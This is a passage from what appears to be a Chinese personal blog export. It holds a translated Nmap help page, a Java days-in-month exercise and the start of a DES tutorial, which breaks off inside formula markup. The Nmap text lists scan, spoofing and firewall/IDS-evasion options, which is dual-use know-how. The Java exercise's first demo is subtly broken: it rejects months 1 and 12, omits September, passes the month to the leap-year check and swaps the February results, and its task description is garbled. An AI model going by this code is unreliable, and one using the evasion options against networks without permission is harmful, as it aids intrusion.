<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap 7.94（https://nmap.org）</span><br><span class="line">用法：nmap [扫描类型] [选项] &#123;目标指定&#125;</span><br><span class="line"></span><br><span class="line">目标指定：</span><br><span class="line">可以传递主机名、IP 地址、网络等。</span><br><span class="line">例如：scanme.nmap.org、microsoft.com/24、192.168.0.1；10.0.0-255.1-254</span><br><span class="line">-iL &lt;输入文件名&gt;：从主机/网络列表中输入</span><br><span class="line">-iR &lt;主机数量&gt;：选择随机目标</span><br><span class="line">--exclude &lt;主机1[，主机2][，主机3]，...&gt;：排除主机/网络</span><br><span class="line">--excludefile &lt;排除文件&gt;：从文件中排除列表</span><br><span class="line"></span><br><span class="line">主机发现：</span><br><span class="line">-sL：列表扫描 - 仅列出要扫描的目标</span><br><span class="line">-sn：Ping 扫描 - 禁用端口扫描</span><br><span class="line">-Pn：将所有主机视为在线 - 跳过主机发现</span><br><span class="line">-PS/PA/PU/PY[portlist]：对给定端口进行 TCP SYN/ACK、UDP 或 SCTP 发现</span><br><span class="line">-PE/PP/PM：ICMP 回显、时间戳和子网掩码请求发现探测</span><br><span class="line">-PO[协议列表]：IP 协议 Ping</span><br><span class="line">-n/-R：从不进行 DNS 解析/始终解析 [默认：有时]</span><br><span class="line">--dns-servers &lt;服务器1[，服务器2]，...&gt;：指定自定义 DNS 服务器</span><br><span class="line">--system-dns：使用操作系统的 DNS 解析器</span><br><span class="line">--traceroute：跟踪到每个主机的跳转路径</span><br><span class="line"></span><br><span class="line">扫描技术：</span><br><span class="line">-sS/sT/sA/sW/sM：TCP SYN/Connect()/ACK/Window/Maimon 扫描</span><br><span class="line">-sU：UDP 扫描</span><br><span class="line">-sN/sF/sX：TCP 空、FIN 和 Xmas 扫描</span><br><span class="line">--scanflags &lt;标志&gt;：自定义 TCP 扫描标志</span><br><span class="line">-sI &lt;僵尸主机[：探测端口]&gt;：空闲扫描-sY/sZ：SCTP 初始化/COOKIE-ECHO 扫描</span><br><span class="line">-sO：IP 协议扫描</span><br><span class="line">-b &lt;FTP 中继主机&gt;：FTP 反弹扫描</span><br><span class="line"></span><br><span class="line">端口指定和扫描顺序：</span><br><span class="line">-p &lt;端口范围&gt;：仅扫描指定的端口</span><br><span class="line">例如：-p22；-p1-65535；-p U：53，111，137,T：21-25，80，139，8080,S：9</span><br><span class="line">--exclude-ports &lt;端口范围&gt;：排除指定的端口不进行扫描</span><br><span class="line">-F：快速模式 - 扫描的端口少于默认扫描</span><br><span class="line">-r：按顺序扫描端口 - 不随机化</span><br><span class="line">--top-ports &lt;数量&gt;：扫描最常见的 &lt;数量&gt; 个端口</span><br><span class="line">--port-ratio &lt;比率&gt;：扫描比 &lt;比率&gt; 更常见的端口</span><br><span class="line"></span><br><span class="line">服务/版本检测：</span><br><span class="line">-sV：探测开放端口以确定服务/版本信息</span><br><span class="line">--version-intensity &lt;级别&gt;：设置从 0（轻度）到 9（尝试所有探测）</span><br><span class="line">--version-light：限制为最有可能的探测（强度 2）</span><br><span class="line">--version-all：尝试每一个探测（强度 9）</span><br><span class="line">--version-trace：显示详细版本扫描活动（用于调试）</span><br><span class="line"></span><br><span class="line">脚本扫描：</span><br><span class="line">-sC：等同于 --script=default</span><br><span class="line">--script=&lt;Lua 脚本&gt;：&lt;Lua 脚本&gt; 是一个以逗号分隔的目录、脚本文件或脚本类别的列表</span><br><span class="line">--script-args=&lt;n1=v1,[n2=v2,...]&gt;：为脚本提供参数</span><br><span class="line">--script-args-file=文件名：在文件中提供 NSE 脚本参数</span><br><span class="line">--script-trace：显示所有发送和接收的数据--script-updatedb：更新脚本数据库。</span><br><span class="line">--script-help=&lt;Lua 脚本&gt;：显示有关脚本的帮助信息。</span><br><span class="line">&lt;Lua 脚本&gt; 是脚本文件或脚本类别的逗号分隔列表。</span><br><span class="line"></span><br><span class="line">操作系统检测：</span><br><span class="line">-O：启用操作系统检测</span><br><span class="line">--osscan-limit：将操作系统检测限制在有希望的目标上</span><br><span class="line">--osscan-guess：更积极地猜测操作系统</span><br><span class="line"></span><br><span class="line">定时和性能：</span><br><span class="line">选项中带 &lt;time&gt; 的参数以秒为单位，或者在值后附加 <span class="string">&#x27;ms&#x27;</span>（毫秒）、<span class="string">&#x27;s&#x27;</span>（秒）、<span class="string">&#x27;m&#x27;</span>（分钟）或 <span class="string">&#x27;h&#x27;</span>（小时）（例如 30m）。</span><br><span class="line">-T&lt;0-5&gt;：设置定时模板（数值越大越快）</span><br><span class="line">--min-hostgroup/max-hostgroup &lt;大小&gt;：并行主机扫描组大小</span><br><span class="line">--min-parallelism/max-parallelism &lt;数量&gt;：探测并行化</span><br><span class="line">--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;时间&gt;：指定探测往返时间。</span><br><span class="line">--max-retries &lt;次数&gt;：限制端口扫描探测重传次数。</span><br><span class="line">--host-timeout &lt;时间&gt;：在指定时间后放弃目标</span><br><span class="line">--scan-delay/--max-scan-delay &lt;时间&gt;：调整探测之间的延迟</span><br><span class="line">--min-rate &lt;数量&gt;：每秒发送数据包的速度不低于 &lt;数量&gt;</span><br><span class="line">--max-rate &lt;数量&gt;：每秒发送数据包的速度不高于 &lt;数量&gt;</span><br><span class="line"></span><br><span class="line">防火墙/入侵检测系统规避和欺骗：</span><br><span class="line">-f； --mtu &lt;值&gt;：分段数据包（可选指定 MTU 值）-D &lt;诱饵1，诱饵2[,ME],...&gt;： 使用诱饵掩盖扫描</span><br><span class="line">-S &lt;IP地址&gt;： 源地址欺骗</span><br><span class="line">-e &lt;接口&gt;： 使用指定接口</span><br><span class="line">-g/--source-port &lt;端口号&gt;： 使用给定的端口号</span><br><span class="line">--proxies &lt;url1,[url2],...&gt;： 通过 HTTP/SOCKS4 代理中继连接</span><br><span class="line">--data &lt;十六进制字符串&gt;： 向发送的数据包附加自定义负载</span><br><span class="line">--data-string &lt;字符串&gt;： 向发送的数据包附加自定义 ASCII 字符串</span><br><span class="line">--data-length &lt;数字&gt;： 向发送的数据包附加随机数据</span><br><span class="line">--ip-options &lt;选项&gt;： 发送带有指定 IP 选项的数据包</span><br><span class="line">--ttl &lt;值&gt;： 设置 IP 生存时间字段</span><br><span class="line">--spoof-mac &lt;MAC 地址/前缀/供应商名称&gt;： 欺骗您的 MAC 地址</span><br><span class="line">--badsum： 发送带有错误 TCP/UDP/SCTP 校验和的数据包</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">-oN/-oX/-oS/-oG &lt;文件&gt;： 分别以普通、XML、脚本小子和可grep格式输出扫描结果到给定的文件名。</span><br><span class="line">-oA &lt;文件名&gt;： 同时以三种主要格式输出</span><br><span class="line">-v： 增加详细程度（使用 -vv 或更多以获得更大效果）</span><br><span class="line">-d： 增加调试级别（使用 -<span class="built_in">dd</span> 或更多以获得更大效果）</span><br><span class="line">--reason： 显示端口处于特定状态的原因</span><br><span class="line">--open： 只显示打开（或可能打开）的端口</span><br><span class="line">--packet-trace： 显示发送和接收的所有数据包--iflist：打印主机接口和路由（用于调试）</span><br><span class="line">--append-output：追加到指定的输出文件，而不是覆盖</span><br><span class="line">--resume &lt;文件名&gt;：恢复中止的扫描</span><br><span class="line">--noninteractive：禁用通过键盘进行的运行时交互</span><br><span class="line">--stylesheet &lt;路径/URL&gt;：用于将 XML 输出转换为 HTML 的 XSL 样式表</span><br><span class="line">--webxml：从 Nmap.Org 引用样式表以获得更通用的 XML</span><br><span class="line">--no-stylesheet：防止将 XSL 样式表与 XML 输出关联</span><br><span class="line"></span><br><span class="line">杂项：</span><br><span class="line">-6：启用 IPv6 扫描</span><br><span class="line">-A：启用操作系统检测、版本检测、脚本扫描和跟踪路由</span><br><span class="line">--datadir &lt;目录名&gt;：指定自定义 Nmap 数据文件位置</span><br><span class="line">--send-eth/--send-ip：使用原始以太网帧或 IP 数据包发送</span><br><span class="line">--privileged：假定用户具有完全权限</span><br><span class="line">--unprivileged：假定用户没有原始套接字权限</span><br><span class="line">-V：打印版本号</span><br><span class="line">-h：打印此帮助摘要页面。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">nmap -v -A scanme.nmap.org</span><br><span class="line">nmap -v -sn 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">nmap -v -iR 10000 -Pn -p 80</span><br><span class="line">有关更多选项和示例，请参阅手册页（https://nmap.org/book/man.html）</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>TOOL</tag>
        <tag>CTF</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Java实战</title>
    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h2><blockquote>
<p>1.案例:输出某年某个月的天数。年份中指定月份的天数。安全描述:本程序运行时，将屏幕上输出指定8，10，12月的天数技术要点:一年中有12个月，其中1，3，5，2月份的天数为29天，为31天;4，6，9，11月的天数为30天;闰年日其它年份为28天。份能被4整队，但不能被100整除，或者判断当前年份是否为闰年，如果为闰年，则该该年份能被400整除</p>
</blockquote>
<h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><h4 id="Main-java"><a href="#Main-java" class="headerlink" title="Main.java"></a>Main.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> year,month;</span><br><span class="line">        System.out.println(<span class="string">&quot;===请输入需要判断的年份===&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        year = sc.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;===请输入需要判断的月份===&quot;</span>);</span><br><span class="line">        month = sc.nextInt();</span><br><span class="line">        <span class="keyword">while</span>(month &lt;=<span class="number">1</span> || month &gt;= <span class="number">12</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;===请输入正确的月份===&quot;</span>);</span><br><span class="line">            month = sc.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        DayInMonth.dayInMonth(year,month);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="DayInMonth-java"><a href="#DayInMonth-java" class="headerlink" title="DayInMonth.java"></a>DayInMonth.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DayInMonth</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dayInMonth</span><span class="params">(<span class="type">int</span> year,<span class="type">int</span> month)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] thrity_noe_for_month = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">12</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] thirth_for_month = &#123;<span class="number">4</span>,<span class="number">6</span>,<span class="number">11</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] february =&#123;<span class="number">2</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> mo : thrity_noe_for_month)&#123;</span><br><span class="line">            <span class="keyword">if</span>(mo == month)&#123;</span><br><span class="line">                System.out.println(year+<span class="string">&quot;年&quot;</span>+month+<span class="string">&quot;月有31天！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> mo : thirth_for_month)&#123;</span><br><span class="line">            <span class="keyword">if</span>(mo == month)&#123;</span><br><span class="line">                System.out.println( year+<span class="string">&quot;年&quot;</span>+month+<span class="string">&quot;月有30天！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(month == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(IsLeapYear.isLeapYear(month))&#123;</span><br><span class="line">                System.out.println(year+<span class="string">&quot;年&quot;</span>+month+<span class="string">&quot;月有28天！&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(year+<span class="string">&quot;年&quot;</span>+month+<span class="string">&quot;月有29天！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="IsLeapYear-java"><a href="#IsLeapYear-java" class="headerlink" title="IsLeapYear.java"></a>IsLeapYear.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IsLeapYear</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isLeapYear</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="comment">//平年</span></span><br><span class="line">        <span class="keyword">if</span> (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span> || year % <span class="number">400</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">===请输入需要判断的年份===</span><br><span class="line">2004</span><br><span class="line">===请输入需要判断的月份===</span><br><span class="line">7</span><br><span class="line">2004年7月有31天！</span><br></pre></td></tr></table></figure>



<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><h4 id="DayInMonth-java-1"><a href="#DayInMonth-java-1" class="headerlink" title="DayInMonth.java"></a>DayInMonth.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DayInMonth</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入年份:&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入月份（1-12）:&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">month</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (month == <span class="number">8</span> || month == <span class="number">10</span> || month == <span class="number">12</span>) &#123;</span><br><span class="line">            System.out.println(month + <span class="string">&quot;月有31天&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (month == <span class="number">4</span> || month == <span class="number">6</span> || month == <span class="number">9</span> || month == <span class="number">11</span>) &#123;</span><br><span class="line">            System.out.println(month + <span class="string">&quot;月有30天&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (month == <span class="number">2</span>) &#123; <span class="comment">// Check for February</span></span><br><span class="line">            <span class="keyword">if</span> (isLeapYear(year)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;2月有29天&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;2月有28天&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (month == <span class="number">1</span> || month == <span class="number">3</span> || month == <span class="number">5</span> || month == <span class="number">7</span>) &#123;</span><br><span class="line">            System.out.println(month + <span class="string">&quot;月有31天&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;无效的月份&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isLeapYear</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (year % <span class="number">400</span> == <span class="number">0</span>) || ((year % <span class="number">4</span> == <span class="number">0</span>) &amp;&amp; (year % <span class="number">100</span> != <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">请输入年份:</span><br><span class="line">2004</span><br><span class="line">请输入月份（1-12）:</span><br><span class="line">2</span><br><span class="line">2月有29天</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title>DES</title>
    <url>/2024/09/13/DES/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><h2 id="一-简介"><a href="#一-简介" class="headerlink" title="(一)简介"></a><strong>(一)简介</strong></h2><ul>
<li>DES算法属于对称密码算法中的分组加密算法。</li>
<li>明文长度为64位。</li>
<li>密钥长度为56位，其中56位参与运算，还需加8位为校验位，一共64位。</li>
<li>当N个64位明文数据块经过DES算法加密后，得到N个64位密文数据块，串联后为密文。</li>
</ul>
<p>​																							<strong>DES加密算法框图</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/DES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%A1%86%E5%9B%BE.png" alt="DES加密算法框图"></p>
<h2 id="二-加密算法分析"><a href="#二-加密算法分析" class="headerlink" title="(二)加密算法分析"></a>(二)加密算法分析</h2><h3 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h3><p>​																							<strong>(a)初始置换IP</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/(a)%E5%88%9D%E5%A7%8B%E7%BD%AE%E6%8D%A2IP.png" alt="(a)初始置换表"></p>
<p>​																								<strong>(b)逆初始置换<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="5.197ex" height="2ex" role="img" focusable="false" viewbox="0 -883.9 2297.1 883.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="msup" transform="translate(504,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g><g data-mml-node="TeXAtom" transform="translate(839.5,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g></g></svg></mjx-container></strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/(b)%E9%80%86%E5%88%9D%E5%A7%8B%E7%BD%AE%E6%8D%A2IP.png" alt="(b)逆初始置换IP"></p>
<p>​															<strong>(c)选择扩展运算E</strong>												       <strong>(d)置换运算P</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/(c)%E9%80%89%E6%8B%A9%E6%89%A9%E5%B1%95%E8%BF%90%E7%AE%97E&(d)%E7%BD%AE%E6%8D%A2%E8%BF%90%E7%AE%97P.png" alt="(c)选择扩展运算E&(d)置换运算P"></p>
<h3 id="轮结构"><a href="#轮结构" class="headerlink" title="轮结构"></a><strong>轮结构</strong></h3><p>​																						<strong>DES算法的轮结构</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/DES%E7%AE%97%E6%B3%95%E7%9A%84%E8%BD%AE%E7%BB%93%E6%9E%84.png" alt="DES算法的轮结构"></p>
<p>​																							<strong>DES算法的轮结构—2(另图)</strong></p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/DES算法的轮结构_2.png" alt="DES算法的轮结构_2" style="zoom:50%;">

<p><strong>轮函数公式：</strong></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.471ex;" xmlns="http://www.w3.org/2000/svg" width="9.799ex" height="2.016ex" role="img" focusable="false" viewbox="0 -683 4331.1 891"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mi" transform="translate(714,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(1285.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="msub" transform="translate(2341.5,0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="24.187ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 10690.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="mi" transform="translate(792,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(1363.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="msub" transform="translate(2419.5,0)"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 